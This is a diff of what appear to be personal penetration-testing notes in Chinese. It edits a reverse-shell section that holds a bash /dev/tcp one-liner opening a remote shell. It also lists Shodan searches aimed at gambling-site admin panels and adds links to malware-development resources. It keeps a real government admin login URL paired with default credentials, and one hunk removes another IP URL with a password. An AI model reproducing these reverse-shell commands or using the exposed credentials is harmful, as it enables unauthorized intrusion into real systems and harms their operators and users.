@@ -287,7 +287,7 @@ src ip：`192.168.0.1`，target ip：`192.168.0.2`，先监听：`rlwrap nc -nvl
 
 ### bash
 
-原教旨主义之重定向与万物皆文件：`bash -i >& /dev/tcp/192.168.0.1/1234 0>&1`
+原教旨：`bash -i >& /dev/tcp/192.168.0.1/1234 0>&1`
 
 ### python
 
@@ -370,8 +370,6 @@ p=subprocess.call(["/bin/bash","-i"])
 3.   `shodan search --fields ip_str,port http.title:"棋牌" http.title:"后台"`
 4.   `shodan search --fields ip_str,port http.html:"Tas9er "`
 
-http://111.67.195.250:15246/firewal1，z9jyojls/z9jyojls
-
 https://mahaeoffice.maharashtra.gov.in/admin/index.jsp，admin/admin
 
 ## sth
@@ -404,4 +402,6 @@ https://mahaeoffice.maharashtra.gov.in/admin/index.jsp，admin/admin
 8.   反弹 shell 参考，[Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 9.   hashcat 密码类型参考，[Generic hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)
 10.   [开源项目信息泄露笔记](https://blog.zgsec.cn/archives/205.html)
-11.   
+11.   [应急响应实战笔记](https://github.com/Bypass007/Emergency-Response-Notes.git)
+12.   [1earn](https://github.com/ffffffff0x/1earn.git)
+13.   [maldev academy](https://maldevacademy.com/)
